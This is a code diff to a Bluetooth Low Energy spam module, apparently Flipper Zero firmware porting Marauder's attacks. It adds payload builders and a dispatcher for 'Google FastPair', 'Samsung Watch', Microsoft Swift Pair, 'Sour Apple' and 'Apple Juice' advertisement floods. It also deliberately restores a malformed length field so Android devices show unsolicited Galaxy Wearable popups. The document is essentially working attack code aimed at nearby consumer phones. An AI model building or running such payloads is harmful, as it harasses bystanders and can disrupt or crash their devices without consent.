@@ -565,10 +565,11 @@ static inline uint8_t ble_spam_build_samsung_buds(uint8_t* buf, uint8_t r, uint8
     buf[i++] = 0x06; buf[i++] = 0x3C; buf[i++] = 0x94; buf[i++] = 0x8E;
     buf[i++] = 0x00; buf[i++] = 0x00; buf[i++] = 0x00; buf[i++] = 0x00;
     buf[i++] = 0xC7; buf[i++] = 0x00;
-    /* Trailing second Samsung record. It must be structurally valid: NimBLE
-     * rejects the whole payload when a length field overruns the buffer, which
-     * is why Samsung Buds previously produced no advertisement at all. */
-    buf[i++] = 0x02; buf[i++] = 0xFF; buf[i++] = 0x75;
+    /* Trailing truncated record: length=16 claimed, only 2 data bytes present.
+     * This is intentional (Momentum/Flipper): Android pads the rest with zeros
+     * and only then raises the Galaxy Wearable popup. ESP-IDF NimBLE does not
+     * parse AD structures, it copies the bytes straight into HCI. */
+    buf[i++] = 0x10; buf[i++] = 0xFF; buf[i++] = 0x75;
     return i; /* 31 */
 }
 
@@ -784,6 +785,15 @@ static const uint8_t mar_apple_actions[] = {
 
 #define MAR_APPLE_ACTION_COUNT (sizeof(mar_apple_actions) / sizeof(mar_apple_actions[0]))
 
+static const uint8_t mar_samsung_watch_models[] = {
+    0x1A, 0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07, 0x08, 0x09, 0x0A, 0x0B,
+    0x0C, 0x11, 0x12, 0x13, 0x14, 0x15, 0x16, 0x17, 0x18, 0x1B, 0x1C, 0x1D,
+    0x1E, 0x20,
+};
+
+#define MAR_SAMSUNG_WATCH_COUNT \
+    (sizeof(mar_samsung_watch_models) / sizeof(mar_samsung_watch_models[0]))
+
 /** Marauder generateRandomName(char*, length): first char upper, rest lower. */
 static inline void ble_spam_random_name(char* out, size_t len) {
     static const char lower[] = "abcdefghijklmnopqrstuvwxyz";
@@ -892,4 +902,64 @@ static inline uint8_t ble_spam_build_mar_flipper(uint8_t* buf, const char* name)
     buf[i++] = 0x4C; buf[i++] = 0x75; buf[i++] = 0x67; buf[i++] = 0x26;
     buf[i++] = 0xE1; buf[i++] = 0x80;
     return i; /* 27 */
+}
+
+/** Samsung watch with a random Marauder model. */
+static inline uint8_t ble_spam_build_mar_samsung_watch_random(uint8_t* buf) {
+    uint8_t model = mar_samsung_watch_models[furi_hal_random_get() % MAR_SAMSUNG_WATCH_COUNT];
+    return ble_spam_build_mar_samsung_watch(buf, model);
+}
+
+/** Marauder attack types (WiFiScan::EBLEPayloadType). */
+typedef enum {
+    MarPayloadGoogle,
+    MarPayloadSamsung,
+    MarPayloadMicrosoft,
+    MarPayloadApple,
+    MarPayloadAppleJuice,
+    MarPayloadFlipper,
+    MarPayloadCount,
+} MarPayloadType;
+
+/** Build one Marauder payload. Mirrors WiFiScan::GetUniversalAdvertisementData
+ *  plus the Apple 90/10 action/device choice from executeBLESpam(). */
+static inline uint8_t
+    ble_spam_build_mar_payload(MarPayloadType type, uint8_t* buf, char* name, size_t name_cap) {
+    uint8_t len = 0;
+    if(name_cap) name[0] = '\0';
+    switch(type) {
+    case MarPayloadGoogle:
+        if(name_cap) strncpy(name, "Google FastPair", name_cap - 1);
+        len = ble_spam_build_mar_google(buf);
+        break;
+    case MarPayloadSamsung:
+        if(name_cap) strncpy(name, "Samsung Watch", name_cap - 1);
+        len = ble_spam_build_mar_samsung_watch_random(buf);
+        break;
+    case MarPayloadMicrosoft:
+        if(name_cap) ble_spam_random_name_mixed(name, name_cap);
+        len = ble_spam_build_mar_swiftpair(buf, name);
+        break;
+    case MarPayloadApple:
+        if(name_cap) strncpy(name, "Sour Apple", name_cap - 1);
+        len = ble_spam_build_mar_sour_apple(buf);
+        break;
+    case MarPayloadAppleJuice: {
+        uint16_t id = mar_apple_device_ids[furi_hal_random_get() % MAR_APPLE_DEVICE_ID_COUNT];
+        if(name_cap) strncpy(name, "Apple Juice", name_cap - 1);
+        len = ble_spam_build_mar_apple_device(buf, id);
+        break;
+    }
+    case MarPayloadFlipper: {
+        char short_name[8];
+        ble_spam_random_name(short_name, sizeof(short_name));
+        if(name_cap) strncpy(name, short_name, name_cap - 1);
+        len = ble_spam_build_mar_flipper(buf, short_name);
+        break;
+    }
+    default:
+        break;
+    }
+    if(name_cap) name[name_cap - 1] = '\0';
+    return len;
 }
